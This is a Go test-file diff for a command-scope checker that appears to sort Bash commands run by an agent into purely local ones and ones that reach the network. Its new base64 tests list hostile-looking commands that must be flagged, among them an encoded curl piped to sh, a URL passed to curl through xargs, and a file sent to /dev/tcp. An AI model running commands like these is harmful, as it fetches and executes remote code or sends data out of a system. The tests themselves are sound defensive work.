@@ -68,7 +68,7 @@ func TestLocalDataDoesNotHideTargetsFromExecutablePipelines(t *testing.T) {
 }
 
 func TestCustomExecutableCannotBorrowLocalToolClassification(t *testing.T) {
-	for _, name := range []string{"sed", "printf"} {
+	for _, name := range []string{"sed", "printf", "base64"} {
 		path := filepath.Join(t.TempDir(), name)
 		if err := os.WriteFile(path, []byte("#!/bin/sh\nexit 0\n"), 0700); err != nil {
 			t.Fatal(err)
@@ -76,10 +76,46 @@ func TestCustomExecutableCannotBorrowLocalToolClassification(t *testing.T) {
 		args := " -n '1p' local.html"
 		if name == "printf" {
 			args = " '%s' 'a local note'"
+		} else if name == "base64" {
+			args = " -d local.txt"
 		}
 		raw, _ := json.Marshal(map[string]string{"command": path + args})
 		if _, unknown := ScopeTargets("Bash", raw); !unknown {
 			t.Errorf("custom %s executable inherited a local exception", name)
+		}
+	}
+}
+
+func TestStaticBase64TransformsAreLocalWithoutHidingExecution(t *testing.T) {
+	for _, command := range []string{
+		`printf '%s' 'example' | base64`,
+		`printf '%s' 'ZXhhbXBsZQ==' | base64 -d`,
+		`base64 --decode -- local.txt`,
+		`base64 -D local.txt`,
+		`base64 -w 0 local.txt`,
+		`base64 --wrap=0 local.txt`,
+		`printf '%s' 'http://outside.example/local-data' | base64`,
+		`base64 'http://outside.example/a-local-filename'`,
+	} {
+		raw, _ := json.Marshal(map[string]string{"command": command})
+		hosts, unknown := ScopeTargets("Bash", raw)
+		if len(hosts) != 0 || unknown {
+			t.Errorf("pure local transform misclassified: %s: hosts=%v unknown=%v", command, hosts, unknown)
+		}
+	}
+	for _, command := range []string{
+		`printf '%s' 'Y3VybCBodHRwOi8vb3V0c2lkZS5leGFtcGxl' | base64 -d | sh`,
+		`printf '%s' 'http://outside.example/' | base64 | xargs curl`,
+		`base64 "$(curl http://outside.example/)"`,
+		`base64 --wrap="$WIDTH" local.txt`,
+		`base64 --wrap=not-a-number local.txt`,
+		`base64 -o /tmp/output local.txt`,
+		`base64 local.txt > /dev/tcp/192.0.2.2/80`,
+	} {
+		raw, _ := json.Marshal(map[string]string{"command": command})
+		hosts, unknown := ScopeTargets("Bash", raw)
+		if !unknown && len(hosts) == 0 {
+			t.Errorf("executable/dynamic transform treated as purely local: %s", command)
 		}
 	}
 }
